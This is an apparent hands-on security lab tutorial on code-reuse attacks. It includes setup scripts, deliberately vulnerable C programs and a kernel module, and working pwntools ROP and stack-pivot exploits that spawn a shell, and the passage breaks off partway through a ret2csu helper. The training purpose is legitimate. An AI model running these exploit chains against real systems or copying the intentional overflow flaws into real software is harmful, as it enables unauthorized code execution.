# Tutorial: Code Reuse Attacks (ROP / JOP / SROP) — Hands-On Lab

> **Domain 4, Chapter 4A — Return-Oriented, Jump-Oriented, Sigreturn-Oriented, and Advanced Code Reuse Exploitation**
>
> **Prerequisite knowledge:** Domain 1 (ELF GOT/PLT, RELRO), Domain 2 (ASLR, stack layout, syscall dispatch, sigreturn), Domain 3 (memory corruption primitives). Basic x86_64 calling convention understanding.
>
> **Lab objectives:** Master the complete code reuse attack lifecycle — from gadget discovery through chain construction, exploitation, and post-exploitation detection. Build offensive chains (ROP, SROP, ret2dlresolve, JOP, BROP), deploy defensive mitigations (CET, CFI, PAC), and develop detection engineering artifacts.

---

## Lab Environment Setup

### VM Requirements

| VM | Role | Specs | OS |
|----|------|-------|----|
| **attacker** | Exploit development | 4 vCPU, 8 GB RAM, 40 GB disk | Ubuntu 24.04 x86_64 |
| **target-user** | User-space targets | 2 vCPU, 4 GB RAM | Ubuntu 22.04 x86_64 (older glibc for wider gadget availability) |
| **target-kernel** | Kernel ROP lab | 2 vCPU, 4 GB RAM | Custom kernel via QEMU (buildroot + vulnerable module) |

### Network Topology

```
┌──────────────────┐         ┌──────────────────┐
│    attacker      │         │   target-user    │
│  192.168.4.10    │◄───────►│  192.168.4.20    │
│  Tools + Scripts │  br0    │  Vulnerable bins  │
└──────────────────┘         └──────────────────┘
                                     │
                             ┌───────┴────────┐
                             │  target-kernel  │
                             │  QEMU internal  │
                             │  10.0.2.15      │
                             └────────────────┘
```

### Tool Installation Script

```bash
#!/bin/bash
# install_code_reuse_lab.sh — Run on attacker VM
set -euo pipefail

echo "[*] Installing system dependencies..."
sudo apt update && sudo apt install -y \
    build-essential gcc-multilib g++-multilib \
    python3 python3-pip python3-venv \
    gdb gdb-multiarch \
    nasm \
    qemu-system-x86 qemu-user-static \
    binutils-aarch64-linux-gnu gcc-aarch64-linux-gnu \
    ruby ruby-dev \
    git cmake \
    linux-headers-$(uname -r) \
    libcapstone-dev \
    elfutils \
    crossbuild-essential-arm64

echo "[*] Installing GDB plugins (pwndbg)..."
if [ ! -d ~/pwndbg ]; then
    git clone https://github.com/pwndbg/pwndbg ~/pwndbg
    cd ~/pwndbg && ./setup.sh
    cd -
fi

echo "[*] Installing Python exploitation libraries..."
python3 -m pip install --user --break-system-packages \
    pwntools \
    angr \
    ropper \
    capstone \
    keystone-engine \
    unicorn

echo "[*] Installing ROPgadget..."
python3 -m pip install --user --break-system-packages ROPgadget

echo "[*] Installing rp++..."
if [ ! -f /usr/local/bin/rp-lin ]; then
    wget -q https://github.com/0vercl0k/rp/releases/latest/download/rp-lin-x64 \
        -O /tmp/rp-lin
    chmod +x /tmp/rp-lin
    sudo mv /tmp/rp-lin /usr/local/bin/rp-lin
fi

echo "[*] Installing one_gadget (Ruby gem)..."
sudo gem install one_gadget

echo "[*] Installing Ropper CLI..."
python3 -m pip install --user --break-system-packages ropper

echo "[*] Installing AFL++ for crash triaging..."
if [ ! -d ~/AFLplusplus ]; then
    git clone https://github.com/AFLplusplus/AFLplusplus ~/AFLplusplus
    cd ~/AFLplusplus && make distrib && sudo make install
    cd -
fi

echo "[*] Creating lab directory structure..."
mkdir -p ~/code_reuse_lab/{binaries,exploits,detection,forensics,framework}

echo "[+] Installation complete. Verify with: ROPgadget --version && ropper --version"
```

### Vulnerable Binary Compilation Script

```bash
#!/bin/bash
# compile_targets.sh — Build all vulnerable binaries for the lab
set -euo pipefail

BINDIR=~/code_reuse_lab/binaries
mkdir -p "$BINDIR"
cd "$BINDIR"

echo "[*] Compiling Lab 1: Classic ROP (no PIE, no canary, NX enabled)..."
cat > vuln_rop_basic.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void print_banner(void) {
    puts("=== ROP Lab Target (Basic) ===");
}

void vuln(void) {
    char buf[64];
    printf("Input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 0x200);
}

int main(void) {
    print_banner();
    vuln();
    puts("Goodbye.");
    return 0;
}
EOF
gcc -no-pie -fno-stack-protector -o vuln_rop_basic vuln_rop_basic.c

echo "[*] Compiling Lab 2: ROP with stack canary (canary + NX, no PIE)..."
cat > vuln_rop_canary.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void format_leak(void) {
    char buf[32];
    printf("Name: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 31);
    printf("Hello, %s!\n", buf);
}

void vuln(void) {
    char buf[64];
    printf("Message: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 0x200);
}

int main(void) {
    format_leak();
    vuln();
    return 0;
}
EOF
gcc -no-pie -fstack-protector-strong -o vuln_rop_canary vuln_rop_canary.c

echo "[*] Compiling Lab 3: PIE + ASLR target (full mitigations except canary)..."
cat > vuln_rop_pie.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void helper(void) {
    printf("Helper at: %p\n", (void*)helper);
    fflush(stdout);
}

void vuln(void) {
    char buf[64];
    helper();
    printf("Input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 0x200);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
EOF
gcc -pie -fPIE -fno-stack-protector -o vuln_rop_pie vuln_rop_pie.c

echo "[*] Compiling Lab 4: SROP target (minimal binary, static, no libc)..."
cat > vuln_srop.S << 'EOF'
.intel_syntax noprefix
.global _start
.section .text

_start:
    ; Print banner
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    lea rsi, [rip+banner]
    mov rdx, 23
    syscall

    ; Read input (overflow)
    xor rax, rax        ; sys_read
    xor rdi, rdi        ; stdin
    lea rsi, [rsp-128]  ; buffer on stack
    mov rdx, 0x400      ; read 1024 bytes into 128-byte "buffer"
    syscall

    ; Normal exit (unreachable if exploited)
    mov rax, 60
    xor rdi, rdi
    syscall

; Gadgets intentionally placed for the lab:
gadget_pop_rax:
    pop rax
    ret

gadget_syscall:
    syscall
    ret

gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rsi:
    pop rsi
    ret

gadget_pop_rdx:
    pop rdx
    ret

.section .rodata
banner: .ascii "=== SROP Lab Target ===\n"
binsh:  .asciz "/bin/sh"
EOF
nasm -f elf64 -o vuln_srop.o vuln_srop.S 2>/dev/null || \
    as --64 -o vuln_srop.o vuln_srop.S
ld -o vuln_srop vuln_srop.o --no-dynamic-linker -static 2>/dev/null || \
    gcc -nostdlib -static -no-pie -o vuln_srop vuln_srop.o

# Alternative: C-based SROP target that is easier to compile
cat > vuln_srop_c.c << 'EOF'
#include <unistd.h>
#include <sys/syscall.h>

char binsh[] = "/bin/sh";

void gadget_syscall_ret(void) {
    __asm__ volatile("syscall; ret");
}

void gadget_pop_rax_ret(void) {
    __asm__ volatile("pop %rax; ret");
}

void _start(void) {
    char buf[128];
    syscall(SYS_write, 1, "SROP> ", 6);
    syscall(SYS_read, 0, buf, 0x400);
    syscall(SYS_exit, 0);
}
EOF
gcc -nostdlib -static -no-pie -fno-stack-protector \
    -o vuln_srop_c vuln_srop_c.c 2>/dev/null || true

echo "[*] Compiling Lab 5: ret2dlresolve target (partial RELRO)..."
cat > vuln_ret2dl.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    printf("Input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 0x200);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
EOF
gcc -no-pie -fno-stack-protector -Wl,-z,norelro -o vuln_ret2dl vuln_ret2dl.c

echo "[*] Compiling Lab 6: Stack pivot target (small overflow + heap data)..."
cat > vuln_pivot.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *heap_buf;

void setup(void) {
    heap_buf = malloc(0x1000);
    printf("Heap buffer at: %p\n", heap_buf);
    printf("Stage data (hex, up to 0x1000 bytes): ");
    fflush(stdout);
    read(STDIN_FILENO, heap_buf, 0x1000);
}

void vuln(void) {
    char buf[32];
    printf("Overflow (small): ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 56);  // Only 16 bytes past buf → overwrite rbp + ret
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setup();
    vuln();
    return 0;
}
EOF
gcc -no-pie -fno-stack-protector -o vuln_pivot vuln_pivot.c

echo "[*] Compiling Lab 7: BROP forking server target..."
cat > vuln_brop.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 9999
#define BUFSIZE 64

void handle_client(int sock) {
    char buf[BUFSIZE];
    char response[] = "OK\n";

    write(sock, "BROP> ", 6);
    ssize_t n = read(sock, buf, 0x200);  // overflow

    // If we reach here without crashing, the canary was correct
    write(sock, response, sizeof(response)-1);
    close(sock);
    _exit(0);
}

int main(void) {
    signal(SIGCHLD, SIG_IGN);
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons(PORT)
    };
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 10);

    printf("[*] BROP target listening on port %d (PID %d)\n", PORT, getpid());
    fflush(stdout);

    while (1) {
        int client = accept(server_fd, NULL, NULL);
        if (fork() == 0) {
            close(server_fd);
            handle_client(client);
        }
        close(client);
    }
}
EOF
gcc -no-pie -fstack-protector-strong -o vuln_brop vuln_brop.c

echo "[*] Compiling Lab 8: JOP target (indirect call dispatch)..."
cat > vuln_jop.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef void (*handler_t)(const char*);

void print_handler(const char *msg) { printf("[PRINT] %s\n", msg); }
void upper_handler(const char *msg) {
    printf("[UPPER] ");
    for (int i = 0; msg[i]; i++) putchar(msg[i] & ~0x20);
    putchar('\n');
}

struct dispatch {
    handler_t handlers[4];
    char name[32];
    char data[64];
};

void process(struct dispatch *d, int idx) {
    if (idx < 4 && d->handlers[idx]) {
        d->handlers[idx](d->data);  // indirect call through function pointer
    }
}

int main(void) {
    struct dispatch d;
    memset(&d, 0, sizeof(d));
    d.handlers[0] = print_handler;
    d.handlers[1] = upper_handler;

    printf("Name: ");
    fflush(stdout);
    read(STDIN_FILENO, d.name, 128);  // overflow into handlers + data

    printf("Index [0-3]: ");
    fflush(stdout);
    int idx;
    scanf("%d", &idx);

    process(&d, idx);
    return 0;
}
EOF
gcc -no-pie -fno-stack-protector -o vuln_jop vuln_jop.c

echo "[*] Compiling Lab 9: COP/COOP target (C++ vtable)..."
cat > vuln_coop.cpp << 'EOF'
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <vector>

class Widget {
public:
    virtual void execute() = 0;
    virtual ~Widget() = default;
};

class Printer : public Widget {
    char msg[64];
public:
    Printer(const char* m) { strncpy(msg, m, 63); msg[63] = 0; }
    void execute() override { printf("[Printer] %s\n", msg); }
};

class Commander : public Widget {
    char cmd[64];
public:
    Commander(const char* c) { strncpy(cmd, c, 63); cmd[63] = 0; }
    void execute() override { system(cmd); }  // dangerous!
};

class Logger : public Widget {
    char path[64];
public:
    Logger(const char* p) { strncpy(path, p, 63); path[63] = 0; }
    void execute() override { printf("[Logger] Logging to %s\n", path); }
};

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    std::vector<Widget*> widgets;
    widgets.push_back(new Printer("Hello World"));
    widgets.push_back(new Logger("/var/log/app.log"));

    // Vulnerability: read raw bytes over a widget pointer (UAF simulation)
    printf("Widget 0 at: %p\n", (void*)widgets[0]);
    printf("Commander vtable hint: %p\n", (void*)&typeid(Commander));

    char buf[256];
    printf("Overwrite widget[0] data (256 bytes): ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);
    memcpy(widgets[0], buf, 256);  // Corrupt widget object

    // Dispatch loop — COOP exploitation surface
    printf("[*] Dispatching widgets...\n");
    for (auto* w : widgets) {
        w->execute();
    }

    for (auto* w : widgets) delete w;
    return 0;
}
EOF
g++ -no-pie -fno-stack-protector -o vuln_coop vuln_coop.cpp

echo "[*] Compiling Lab 10: ret2csu target (limited gadgets)..."
cat > vuln_ret2csu.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

// Binary with minimal gadgets — only __libc_csu_init provides useful ones
void vuln(void) {
    char buf[64];
    printf("Input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 0x200);
}

// write() is linked but we have limited pop gadgets
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("ret2csu challenge: leak with limited gadgets");
    vuln();
    return 0;
}
EOF
# Compile with older GCC or specific flags to preserve __libc_csu_init
gcc -no-pie -fno-stack-protector -static-libgcc -o vuln_ret2csu vuln_ret2csu.c

echo "[*] Compiling ARM64 JOP target..."
cat > vuln_arm64_jop.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    printf("Input: ");
    fflush(stdout);
    read(0, buf, 0x200);
}

int main(void) {
    vuln();
    return 0;
}
EOF
aarch64-linux-gnu-gcc -no-pie -fno-stack-protector \
    -o vuln_arm64_jop vuln_arm64_jop.c 2>/dev/null || \
    echo "[!] ARM64 cross-compiler not available; skip ARM64 binary"

echo "[*] Building kernel module for kROP lab..."
mkdir -p kmod && cat > kmod/vuln_kmod.c << 'EOF'
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

static ssize_t vuln_write(struct file *f, const char __user *buf,
                          size_t len, loff_t *off) {
    char kbuf[64];
    if (len > 512) len = 512;
    if (copy_from_user(kbuf, buf, len))
        return -EFAULT;
    return len;
}

static const struct proc_ops vuln_ops = {
    .proc_write = vuln_write,
};

static int __init vuln_init(void) {
    proc_create("vuln_krop", 0666, NULL, &vuln_ops);
    pr_info("vuln_krop: loaded (buffer overflow via /proc/vuln_krop)\n");
    return 0;
}

static void __exit vuln_exit(void) {
    remove_proc_entry("vuln_krop", NULL);
    pr_info("vuln_krop: unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Vulnerable kernel module for kROP lab");
EOF

cat > kmod/Makefile << 'EOF'
obj-m += vuln_kmod.o
KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
EOF

echo "[+] All targets compiled in: $BINDIR"
echo "[+] To build kernel module: cd $BINDIR/kmod && make"
ls -la "$BINDIR"/vuln_*
```

### Environment Verification

```bash
#!/bin/bash
# verify_lab.sh — Confirm all tools and binaries are ready
set -u

PASS=0; FAIL=0

check() {
    if eval "$2" &>/dev/null; then
        echo "[✓] $1"
        ((PASS++))
    else
        echo "[✗] $1"
        ((FAIL++))
    fi
}

echo "=== Code Reuse Lab Environment Verification ==="
echo ""

# Tools
check "ROPgadget installed" "ROPgadget --version"
check "Ropper installed" "ropper --version"
check "rp++ installed" "rp-lin --version || rp-lin --help"
check "one_gadget installed" "one_gadget --version"
check "pwntools importable" "python3 -c 'from pwn import *'"
check "angr importable" "python3 -c 'import angr'"
check "GDB available" "gdb --version"
check "pwndbg loaded" "gdb -batch -ex 'python import pwndbg' 2>&1 | grep -v Error"
check "nasm available" "nasm --version"
check "aarch64 gcc available" "aarch64-linux-gnu-gcc --version"
check "QEMU user-mode available" "qemu-aarch64 --version"
check "AFL++ available" "afl-fuzz --version 2>&1 | head -1"

echo ""
# Binaries
BINDIR=~/code_reuse_lab/binaries
check "vuln_rop_basic exists" "file $BINDIR/vuln_rop_basic | grep ELF"
check "vuln_rop_canary exists" "file $BINDIR/vuln_rop_canary | grep ELF"
check "vuln_rop_pie exists" "file $BINDIR/vuln_rop_pie | grep ELF"
check "vuln_srop_c exists" "file $BINDIR/vuln_srop_c | grep ELF"
check "vuln_ret2dl exists" "file $BINDIR/vuln_ret2dl | grep ELF"
check "vuln_pivot exists" "file $BINDIR/vuln_pivot | grep ELF"
check "vuln_brop exists" "file $BINDIR/vuln_brop | grep ELF"
check "vuln_jop exists" "file $BINDIR/vuln_jop | grep ELF"
check "vuln_coop exists" "file $BINDIR/vuln_coop | grep ELF"
check "vuln_ret2csu exists" "file $BINDIR/vuln_ret2csu | grep ELF"

echo ""
# Security settings
check "ASLR enabled" "cat /proc/sys/kernel/randomize_va_space | grep -q 2"
check "NX support" "grep -q nx /proc/cpuinfo"

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ $FAIL -eq 0 ] && echo "[+] Lab environment ready!" || echo "[-] Fix failures before proceeding."
```

---

## PART A: OFFENSIVE — Attack Scenarios

### Exercise 1: ROP Fundamentals — Gadget Discovery and ret2libc

**Objective:** Master gadget discovery tools, construct a two-stage ret2libc chain (leak + shell), and understand stack alignment requirements.

#### Step 1.1: Binary Reconnaissance

```bash
cd ~/code_reuse_lab/binaries

# Check protections
checksec --file=vuln_rop_basic
# Expected:
#   Arch:     amd64-64-little
#   RELRO:    Partial RELRO
#   Stack:    No canary found
#   NX:       NX enabled
#   PIE:      No PIE (0x400000)

# Identify the overflow
gdb -q vuln_rop_basic -batch \
    -ex "disas vuln" \
    -ex "quit"
# Key: read(0, buf, 0x200) where buf is [rbp-0x40]
# Overflow offset: 64 (buffer) + 8 (saved rbp) = 72 bytes to return address

# Identify useful PLT/GOT entries
objdump -d vuln_rop_basic | grep "@plt>:" | head -20
# Look for: puts@plt, read@plt, printf@plt

# Get the libc used
ldd vuln_rop_basic
# Note the libc path (e.g., /lib/x86_64-linux-gnu/libc.so.6)
```

#### Step 1.2: Gadget Discovery with Multiple Tools

```bash
# === ROPgadget ===
# Full gadget enumeration
ROPgadget --binary vuln_rop_basic > /tmp/all_gadgets.txt
wc -l /tmp/all_gadgets.txt
# Typical: 50-200 gadgets in a small binary

# Search for specific register-setting gadgets
ROPgadget --binary vuln_rop_basic --only "pop|ret" | grep "pop rdi"
ROPgadget --binary vuln_rop_basic --only "pop|ret" | grep "pop rsi"

# Search for alignment gadget
ROPgadget --binary vuln_rop_basic --only "ret"

# Attempt automated chain generation
ROPgadget --binary vuln_rop_basic --ropchain

# === Ropper ===
# Interactive gadget search
ropper -f vuln_rop_basic --search "pop rdi"
ropper -f vuln_rop_basic --search "pop rsi"
ropper -f vuln_rop_basic --search "ret"

# Search for syscall gadgets (likely absent in small binary)
ropper -f vuln_rop_basic --search "syscall"

# Export in useful format
ropper -f vuln_rop_basic --type rop --all

# === rp++ ===
# Fast scan with max depth 5
rp-lin -f vuln_rop_basic -r 5 | grep "pop rdi"
rp-lin -f vuln_rop_basic -r 5 | grep "pop rsi"

# === Scan libc for richer gadget set ===
LIBC=$(ldd vuln_rop_basic | grep libc | awk '{print $3}')
echo "Scanning libc at: $LIBC"

ROPgadget --binary "$LIBC" --only "pop|ret" | grep "pop rdi" | head -5
ROPgadget --binary "$LIBC" --only "pop|ret" | grep "pop rdx" | head -5
ROPgadget --binary "$LIBC" --only "syscall|ret" | head -5

# Find one_gadgets in libc
one_gadget "$LIBC"
# Record all one_gadget offsets and constraints
```

#### Step 1.3: Two-Stage ret2libc Exploit

```python
#!/usr/bin/env python3
"""
Exercise 1.3: Classic ret2libc — leak puts@GOT, then system("/bin/sh").
Target: vuln_rop_basic (no PIE, no canary, NX enabled, Partial RELRO)
"""
from pwn import *

# Configuration
context.binary = elf = ELF("./vuln_rop_basic")
libc = ELF(elf.libc.path)  # auto-detect linked libc
context.log_level = "info"

# Gadgets from the binary (fixed addresses, no PIE)
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

log.info(f"pop rdi; ret = {hex(POP_RDI)}")
log.info(f"ret (align)  = {hex(RET)}")

# --- Stage 1: Leak a libc address ---
p = process("./vuln_rop_basic")

payload1  = b"A" * 72                    # overflow to saved RIP
payload1 += p64(POP_RDI)                 # pop rdi; ret
payload1 += p64(elf.got["puts"])         # rdi = &GOT[puts] (resolved libc address)
payload1 += p64(elf.plt["puts"])         # call puts(GOT[puts]) → prints address
payload1 += p64(elf.symbols["main"])     # return to main for stage 2

p.sendafter(b"Input: ", payload1)

# Parse leaked address
# puts outputs bytes until NUL; libc addresses are 6 bytes on x86_64
# (high 2 bytes are 0x00 0x7f typically)
leaked_line = p.recvline()
leaked_puts = u64(leaked_line.strip().ljust(8, b"\x00"))

# Validate: libc addresses should be page-aligned when computing base
libc.address = leaked_puts - libc.symbols["puts"]
assert libc.address & 0xfff == 0, f"Bad libc base: {hex(libc.address)}"

log.success(f"Leaked puts@libc = {hex(leaked_puts)}")
log.success(f"libc base        = {hex(libc.address)}")

# --- Stage 2: Call system("/bin/sh") ---
bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]

log.info(f"system()    = {hex(system)}")
log.info(f"/bin/sh     = {hex(bin_sh)}")

# The RET before POP_RDI fixes 16-byte stack alignment.
# Without it, glibc's system() executes movaps with unaligned RSP → SIGSEGV.
payload2  = b"A" * 72
payload2 += p64(RET)                     # alignment gadget
payload2 += p64(POP_RDI)                 # pop rdi; ret
payload2 += p64(bin_sh)                  # rdi = "/bin/sh"
payload2 += p64(system)                  # call system("/bin/sh")

p.sendafter(b"Input: ", payload2)

log.success("Shell obtained!")
p.interactive()
```

#### Step 1.4: Verify in GDB

```bash
# Run exploit under GDB to observe chain execution
gdb -q vuln_rop_basic \
    -ex "break *vuln+30" \
    -ex "run < <(python3 -c 'from pwn import *; print((b\"A\"*72 + p64(0x4011d3) + p64(0x404018) + p64(0x401040) + p64(0x401156)).hex())')" \
    -ex "x/16gx \$rsp" \
    -ex "si" \
    -ex "info registers rdi rsp rip"

# Observe: after ret from vuln(), RIP lands on pop_rdi gadget.
# After pop rdi, rdi = GOT[puts] address.
# Next ret goes to puts@PLT → prints the resolved puts address.
# Final ret goes to main → program restarts for stage 2.
```

**Expected output:** A shell prompt via `system("/bin/sh")`.

---

### Exercise 2: Stack Pivoting — Redirect RSP to Attacker-Controlled Memory

**Objective:** Exploit a small overflow (insufficient space for full chain) by pivoting the stack to a heap buffer containing the full ROP chain.

#### Step 2.1: Analyze the Pivot Target

```bash
checksec --file=vuln_pivot
# Note: buffer is 32 bytes, overflow allows only 24 extra bytes (56 total read)
# That's: 32 (buf) + 8 (rbp) + 16 bytes for return chain = only 2 gadget slots!
# Full ret2libc needs ~5-7 slots → must pivot to heap

gdb -q vuln_pivot -batch -ex "disas vuln"
# Key insight: read allows overwriting saved RBP and one return address
# leave;ret = mov rsp, rbp; pop rbp; ret → if we control saved RBP,
# the 'leave' instruction pivots RSP to our controlled value!
```

#### Step 2.2: Pivot Gadget Analysis

```bash
# Find pivot gadgets
ROPgadget --binary vuln_pivot --only "leave|ret"
# leave; ret is the most common pivot — appears in function epilogues

ropper -f vuln_pivot --search "leave"
# Expected: 0x00401xxx: leave; ret

# Alternative pivot gadgets (for reference)
ropper -f vuln_pivot --search "xchg"
# xchg rax, rsp; ret — requires controlling rax
# pop rsp; ret — directly sets rsp from stack (needs 2+ slots)
```

#### Step 2.3: Stack Pivot Exploit

```python
#!/usr/bin/env python3
"""
Exercise 2: Stack pivot to heap via leave;ret.
The overflow is only 24 bytes past the buffer — insufficient for a full chain.
Strategy: write full ROP chain to heap, then pivot RSP there via leave;ret.
"""
from pwn import *

context.binary = elf = ELF("./vuln_pivot")
libc = ELF(elf.libc.path)
context.log_level = "info"

p = process("./vuln_pivot")

# Parse leaked heap address
p.recvuntil(b"Heap buffer at: ")
heap_addr = int(p.recvline().strip(), 16)
log.info(f"Heap buffer at: {hex(heap_addr)}")

# Gadgets from binary
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]
LEAVE_RET = rop.find_gadget(['leave', 'ret'])[0]

log.info(f"leave; ret = {hex(LEAVE_RET)}")

# === Stage 1: Write full ROP chain to heap buffer ===
# The heap buffer will become our "new stack" after pivoting.
# Layout on heap: [fake_rbp] [rop_chain...]
# fake_rbp can be anything (it gets popped by the leave's implicit pop rbp)

# Build the full chain that will live on the heap
chain  = p64(0xdeadbeef)                 # fake RBP (consumed by leave's pop rbp)
chain += p64(POP_RDI)                    # pop rdi; ret
chain += p64(elf.got["puts"])            # rdi = GOT[puts]
chain += p64(elf.plt["puts"])            # call puts → leak libc
chain += p64(elf.symbols["main"])        # restart for stage 2

# Pad to expected size
chain = chain.ljust(0x100, b"\x00")

p.sendafter(b"Stage data", chain)

# === Stage 2: Overflow with pivot ===
# vuln() has: char buf[32]; read(0, buf, 56)
# Stack layout: [buf:32] [saved_rbp:8] [saved_rip:8] → 48 bytes to RIP
# We overflow saved_rbp with (heap_addr) so that:
#   leave → mov rsp, rbp (rsp = heap_addr) → pop rbp (rbp = heap[0] = fake)
#   ret → pops from heap[8] = POP_RDI → chain executes from heap!

pivot_payload  = b"B" * 32              # fill buffer
pivot_payload += p64(heap_addr)         # overwrite saved RBP → pivot target
pivot_payload += p64(LEAVE_RET)         # overwrite saved RIP → trigger pivot

p.sendafter(b"Overflow", pivot_payload)

# Parse libc leak
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"libc base = {hex(libc.address)}")

# === Stage 3: Write shell chain to heap, pivot again ===
bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]

# Re-enter: write new chain to heap
p.recvuntil(b"Heap buffer at: ")
heap_addr2 = int(p.recvline().strip(), 16)

chain2  = p64(0xcafebabe)               # fake RBP
chain2 += p64(RET)                      # alignment
chain2 += p64(POP_RDI)
chain2 += p64(bin_sh)
chain2 += p64(system)
chain2 = chain2.ljust(0x100, b"\x00")

p.sendafter(b"Stage data", chain2)

pivot2  = b"C" * 32
pivot2 += p64(heap_addr2)
pivot2 += p64(LEAVE_RET)

p.sendafter(b"Overflow", pivot2)

p.interactive()
```

**Key concept:** `leave; ret` = `mov rsp, rbp; pop rbp; ret`. Controlling saved RBP gives you a 1-gadget stack pivot. This is the most common pivot in real exploits because every function epilogue contains `leave; ret`.

---

### Exercise 3: ret2csu — Multi-Argument Calls with Limited Gadgets

**Objective:** Use `__libc_csu_init` gadgets to call functions with up to 3 arguments when standard `pop rdx; ret` gadgets are absent.

#### Step 3.1: Understanding __libc_csu_init

```bash
# Disassemble __libc_csu_init to find the universal gadgets
gdb -q vuln_ret2csu -batch \
    -ex "disas __libc_csu_init"

# Expected output (key portions):
# Popping gadget (end of function):
#   0x40119a: pop rbx
#   0x40119b: pop rbp
#   0x40119c: pop r12
#   0x40119e: pop r13
#   0x4011a0: pop r14
#   0x4011a2: pop r15
#   0x4011a4: ret
#
# Calling gadget (middle of function):
#   0x401180: mov rdx, r14    ; third arg
#   0x401183: mov rsi, r13    ; second arg
#   0x401186: mov edi, r12d   ; first arg (32-bit only!)
#   0x401189: call [r15+rbx*8]; indirect call
#   0x40118d: add rbx, 1
#   0x401191: cmp rbp, rbx
#   0x401194: jne 0x401180
#   ; falls through to popping gadget

# Note the addresses — they vary per binary. Verify yours:
objdump -d vuln_ret2csu | grep -A 30 "__libc_csu_init"
```

#### Step 3.2: ret2csu Exploit — write() with 3 Arguments

```python
#!/usr/bin/env python3
"""
Exercise 3: ret2csu — use __libc_csu_init gadgets to call write(1, GOT[puts], 8)
to leak a libc address without needing pop rdx;ret (which doesn't exist in this binary).
"""
from pwn import *

context.binary = elf = ELF("./vuln_ret2csu")
libc = ELF(elf.libc.path)
context.log_level = "info"

# Find the exact csu gadget offsets
# These MUST be verified from disassembly — they shift per build
CSU_POP = None
CSU_CALL = None

# Automated detection via pwntools
rop = ROP(elf)
try:
    # pwntools has built-in ret2csu support in newer versions
    csu_gadgets = rop.find_gadget(['pop rbx', 'pop rbp', 'pop r12',
                                    'pop r13', 'pop r14', 'pop r15', 'ret'])
    CSU_POP = csu_gadgets[0]
    log.info(f"CSU pop gadget at: {hex(CSU_POP)}")
except:
    # Manual detection
    csu_init = elf.symbols.get('__libc_csu_init', 0)
    if csu_init:
        # Typical offsets: pop at +0x5a, call at +0x40 (varies!)
        CSU_POP = csu_init + 0x5a
        CSU_CALL = csu_init + 0x40
        log.info(f"CSU pop (estimated): {hex(CSU_POP)}")
        log.info(f"CSU call (estimated): {hex(CSU_CALL)}")

# Verify by disassembling
if CSU_POP:
    log.info(f"Disasm at CSU_POP: {disasm(elf.read(CSU_POP, 16), vma=CSU_POP)}")

# Build the ret2csu helper function
def ret2csu(func_got, rdi_32, rsi, rdx, csu_pop, csu_call):
    """
    Construct a ret2csu chain.
    NOTE: rdi is only 32-bit (edi = r12d). Full 64-bit rdi requires a
    separate pop rdi;ret gadget or the value must fit in 32 bits.

    Chain flow:
    1. ret to CSU_POP → pops rbx=0, rbp=1, r12=rdi, r13=rsi, r14=rdx, r15=func_got
    2. ret to CSU_CALL → mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
    3. After call returns: add rbx,1; cmp rbp,rbx → equal → falls through
    4. Falls into POP sequence again → we provide 7 dummy qwords + ret addr
    """
    chain  = p64(csu_pop)
    chain += p64(0)                  # rbx = 0
    chain += p64(1)                  # rbp = 1 (so cmp rbp, rbx+1 passes)
    chain += p64(rdi_32)             # r12 → edi (32-bit!)
    chain += p64(rsi)                # r13 → rsi
    chain += p64(rdx)                # r14 → rdx
    chain += p64(func_got)           # r15 → call [r15 + rbx*8] = call [func_got]
    chain += p64(csu_call)           # jump to calling gadget
    # After the call returns, the cmp passes and falls through to pops:
